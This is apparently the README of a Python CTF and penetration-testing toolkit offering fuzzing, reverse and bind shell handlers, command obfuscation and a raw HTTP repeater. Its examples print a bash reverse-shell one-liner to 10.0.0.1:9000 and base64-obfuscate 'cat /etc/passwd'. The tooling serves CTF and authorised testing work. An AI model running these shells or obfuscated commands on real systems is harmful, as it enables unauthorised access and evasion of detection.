# hello-ctf

A professional CTF and penetration testing toolkit written in Python.

## Features

### 🔥 Fuzzing & Brute-force
- **BurpAsync** - Async concurrent fuzzing framework with rich TUI
- **BurpAsyncPool** - Multi-worker parallel execution
- **WordlistLoader** - High-performance wordlist loader with O(1) random access and checkpoint support

### 🐚 Shell & Command Execution
- **ReverseShell** / **BindShell** - TCP shell handler with 20+ built-in templates
- **RunCmd** - Non-blocking command executor with process group management
- **Obfuscator** - 18+ command obfuscation techniques (base64, hex, IFS, etc.)

### 🌐 HTTP Tools
- **Repeater** - Raw HTTP request sender with encoding support (gzip/deflate/brotli/chunked)
- **HttpEcho** - Request logging server
- **HttpFile** - File download server

### 🔧 Utilities
- **Local IP Detection** - Cross-platform intelligent network interface selection

## Installation

```bash
# Clone and install with uv
uv sync

# Or install as package
uv pip install -e .
```

## Quick Start

### Fuzzing with BurpAsyncPool

```python
import asyncio
from ctf.burp.burp import BurpAsyncPool, Step

async def main():
    # Define your fuzzing steps
    steps = [
        Step("check_path", handler=check_path_handler),
        Step("verify_sqli", handler=verify_sqli_handler),
    ]

    # Run with multiple workers
    pool = BurpAsyncPool(
        payload=wordlist_generator,
        build_runtime=create_session,
        build_state=create_state,
        steps=steps,
        workers=10,
    )

    results = await pool.run()
    print(f"Found {len(results)} results")

asyncio.run(main())
```

### Wordlist Loader

```python
from ctf.burp.wordlist import WordlistLoader

with WordlistLoader("passwords.txt", continue_=True) as wl:
    for word in wl:
        # Resume from checkpoint automatically
        print(word)
```

### TCP Shell

```python
from ctf.shell.tcp_shell import ReverseShell, gen_shell_r_cmd

# Generate reverse shell command
cmd = gen_shell_r_cmd("bash_i", "10.0.0.1", 9000)
print(cmd)  # bash -i >& /dev/tcp/10.0.0.1/9000 0>&1

# Start listener
with ReverseShell(port=9000) as shell:
    shell.sendline("whoami")
    print(shell.output())
```

### Command Obfuscation

```python
from ctf.shell.obf import apply_obf, random_obf

# Single technique
obf_cmd = apply_obf("base64", "cat /etc/passwd")
# echo d2hvYW1p | base64 -d | bash

# Multiple techniques
obf_cmd = apply_obf("cat /etc/passwd", ["base64", "bash_c_ifs1"])

# Random obfuscation
obf_cmd = random_obf("cat /etc/passwd", depth=3)
```

### HTTP Repeater

```python
from ctf.http.repeater import repeater

# Simple request (string format, auto-converts to bytes)
resp = repeater(
    "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n",
    use_ssl=True,
)

print(resp.status_line())
print(resp.headers())
print(resp.body_text())

# With custom headers
req = """GET /api HTTP/1.1
Host: target.com


"""
resp = repeater(
    req,
    use_ssl=True,
    verify_ssl=False,
    headers={"Authorization": "Bearer xxx", "X-Custom": "value"},
)
```

## Project Structure

```
src/ctf/
├── burp/           # Fuzzing framework
│   ├── burp.py     # BurpAsync & BurpAsyncPool
│   └── wordlist.py # WordlistLoader
├── http/           # HTTP tools
│   ├── repeater.py # HTTP client
│   └── server.py   # Echo & file servers
├── shell/          # Shell & command
│   ├── obf.py      # Command obfuscation
│   ├── run_cmd.py  # Command executor
│   └── tcp_shell.py# Reverse/Bind shell
└── utils/          # Utilities
    ├── local_ip.py # IP detection
    └── log.py      # Logging
```

## Requirements

- Python 3.13+
- brotli >= 1.2.0
- brotlipy >= 0.7.0
- psutil >= 7.2.2
- rich >= 15.0.0
- xxhash >= 3.7.0

## Development

```bash
# Run tests
uv run pytest

# Type check
uv run mypy src/

# Lint
uv run ruff check src/
```

## License

MIT License